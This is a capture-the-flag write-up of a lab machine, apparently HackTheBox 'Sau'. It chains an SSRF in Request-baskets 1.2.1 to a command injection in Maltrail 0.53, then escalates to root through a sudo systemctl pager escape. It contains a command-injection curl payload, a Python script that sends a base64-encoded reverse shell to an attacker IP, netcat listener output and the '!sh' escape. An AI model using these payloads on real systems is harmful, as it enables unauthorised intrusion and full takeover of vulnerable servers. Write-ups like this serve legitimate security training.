Running Nmap we found some http service in the port 55555, checking the url http://10.10.11.224:55555 we found a webapp called Request-baskets v1.2.1. This app is used to collect and inspect HTTP requests. and googling that we found a SSRF vulnerability **[CVE-2023-27163](https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3)** and after trying to upload some shells we don't get a proper access so let's try to dive in the web application.

We create a new basket and checking the configuration we can set a forward url

![[Pasted image 20230807145907.png]]

![[Pasted image 20230807150009.png]]

We saw in the nmap enumeration a filtered 80 http port, so let's try to redirect the server to its own ip, to the port 80. After that, if we access to the provided url it will be redirected to port 80, where we can find an outdated app called Mailtrail version 0.53

![[Pasted image 20230807151106.png]]

Checking info for this app we found that is vulnerable to RCE through the `/login` page so let's change the forward url to `http://127.0.0.1:80/login` and now we have the login page

![[Pasted image 20230807151658.png]]

The **[POC](https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/)** says that we can have a command execution passing the command to execute through username variable like this

```bash
curl 'http://hostname:8338/login' --data 'username=;`whoami`'
```

Base on this **[exploit](https://github.com/spookier/Maltrail-v0.53-Exploit/tree/main)** we forge our following exploit which gets a reverse shell and points to a our ip on port 1234

```python
import os;
import base64;

payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
encoded_payload = base64.b64encode(payload.encode()).decode()  # encode the payload in Base64
command = f"curl 'http://10.10.11.224:55555/6mx3uvo' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
os.system(command)
```

So executing the script we grab a shell with a netcat listener

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Sau-10.10.11.224]
└─$ python script.py

--------------------

┌──(kali㉿kali)-[~]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.224] 56776
$ whoami
puma
```

Upgrade TTY, and lets escalate privileges

```bash
puma@sau:/opt/maltrail$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

Our user can execute systemctl status for trail service as root so lets google that. Here we find **[this](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/)** page which says the following

![[Pasted image 20230807153356.png]]

So executing the command as sudo and writing `!sh` in the pager should give us a shell as root

```bash
puma@sau:/opt/maltrail$ sudo systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)  !sh
# whoami
root
```

And we are root